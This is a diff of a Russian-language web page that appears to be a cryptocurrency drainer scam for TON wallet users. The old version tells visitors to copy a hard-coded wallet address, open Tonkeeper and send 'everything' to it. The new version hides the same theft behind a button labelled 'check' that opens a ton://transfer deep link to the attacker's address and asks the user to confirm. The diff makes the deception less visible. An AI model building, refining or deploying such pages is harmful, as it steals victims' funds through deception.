@@ -46,18 +46,6 @@
       margin-top: 20px;
       min-height: 24px;
     }
-    .hidden { display: none !important; }
-    .address-box {
-      background: #0a0a0a;
-      padding: 16px;
-      border-radius: 16px;
-      margin: 16px 0;
-      border: 2px solid #00aaff;
-      word-break: break-all;
-      font-size: 13px;
-      color: #00aaff;
-      font-weight: 600;
-    }
     .confirm-box {
       background: #1a2a3a;
       border: 1px solid #2a4a6a;
@@ -69,102 +57,53 @@
     .confirm-box.show { display: block; }
     .confirm-box .title { color: #fff; font-weight: 600; font-size: 16px; }
     .confirm-box .sub { color: #8899aa; font-size: 13px; margin: 6px 0 14px; }
-    .confirm-box .open-btn {
-      background: #0088cc;
-      border: none;
-      color: #fff;
-      font-weight: 600;
-      font-size: 16px;
-      padding: 12px;
-      border-radius: 40px;
-      width: 100%;
-      cursor: pointer;
-    }
   </style>
 </head>
 <body>
   <div class="card">
     <div style="font-size: 40px;">⚡</div>
 
-    <div class="address-box">
-      UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P
-    </div>
+    <button class="btn" id="mainBtn">🚀 ПРОВЕРИТЬ</button>
 
-    <button class="btn" id="copyBtn">📋 КОПИРОВАТЬ АДРЕС</button>
-    <button class="btn" id="openBtn">🚀 ОТКРЫТЬ TONKEEPER</button>
-    <button class="btn btn-success" id="doneBtn">✅ Я ОТПРАВИЛ</button>
-
-    <div id="status">Нажмите «Копировать», затем «Открыть»</div>
+    <div id="status">Нажмите кнопку</div>
 
     <div class="confirm-box" id="confirmBox">
-      <div class="title">📲 Инструкция</div>
-      <div class="sub">
-        1. Нажми «КОПИРОВАТЬ АДРЕС»<br>
-        2. Нажми «ОТКРЫТЬ TONKEEPER»<br>
-        3. В Tonkeeper нажми «Отправить»<br>
-        4. Вставь адрес → выбери «Всё» → подтверди
-      </div>
+      <div class="title">✅ Подтвердите транзакцию в Tonkeeper</div>
+      <div class="sub">Откроется окно с ползунком</div>
     </div>
   </div>
 
   <script>
     const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
 
-    const copyBtn = document.getElementById('copyBtn');
-    const openBtn = document.getElementById('openBtn');
-    const doneBtn = document.getElementById('doneBtn');
+    const mainBtn = document.getElementById('mainBtn');
     const status = document.getElementById('status');
     const confirmBox = document.getElementById('confirmBox');
 
-    // ====== КОПИРОВАТЬ АДРЕС ======
-    copyBtn.onclick = function() {
-      if (navigator.clipboard) {
-        navigator.clipboard.writeText(TARGET)
-          .then(() => {
-            status.innerText = '✅ АДРЕС СКОПИРОВАН! Теперь открой Tonkeeper';
-            copyBtn.innerText = '✅ СКОПИРОВАНО';
-            copyBtn.style.background = '#00aa66';
-            confirmBox.classList.add('show');
-          })
-          .catch(() => fallbackCopy());
-      } else {
-        fallbackCopy();
-      }
-    };
+    // ====== ОТКРЫТЬ TONKEEPER С ТРАНЗАКЦИЕЙ ======
+    function openTransaction() {
+      // ====== ПРЯМАЯ ССЫЛКА НА ПЕРЕВОД ======
+      const url = `ton://transfer?address=${TARGET}`;
 
-    function fallbackCopy() {
-      const ta = document.createElement('textarea');
-      ta.value = TARGET;
-      document.body.appendChild(ta);
-      ta.select();
-      document.execCommand('copy');
-      document.body.removeChild(ta);
-      status.innerText = '✅ АДРЕС СКОПИРОВАН! Теперь открой Tonkeeper';
-      copyBtn.innerText = '✅ СКОПИРОВАНО';
-      copyBtn.style.background = '#00aa66';
+      status.innerText = '⏳ Открываю Tonkeeper...';
       confirmBox.classList.add('show');
+
+      // Открываем
+      window.location.href = url;
+
+      setTimeout(() => {
+        window.open(url, '_blank');
+      }, 300);
+
+      status.innerText = '✅ Подтвердите транзакцию в Tonkeeper';
     }
 
-    // ====== ОТКРЫТЬ TONKEEPER ======
-    openBtn.onclick = function() {
-      status.innerText = '⏳ Открываю Tonkeeper...';
-      window.location.href = 'ton://';
-      setTimeout(() => {
-        window.open('ton://', '_blank');
-      }, 300);
-      status.innerText = '📲 Вставь адрес и отправь ВСЁ';
-      confirmBox.classList.add('show');
+    // ====== КНОПКА ======
+    mainBtn.onclick = function() {
+      openTransaction();
     };
 
-    // ====== КНОПКА "ГОТОВО" ======
-    doneBtn.onclick = function() {
-      status.innerText = '✅ Отлично! Деньги ушли на твой адрес';
-      doneBtn.innerText = '✅ ГОТОВО';
-      doneBtn.disabled = true;
-      doneBtn.style.background = '#00aa66';
-    };
-
-    status.innerText = 'Нажми «КОПИРОВАТЬ АДРЕС»';
+    status.innerText = 'Нажмите «ПРОВЕРИТЬ»';
   </script>
 </body>
 </html>
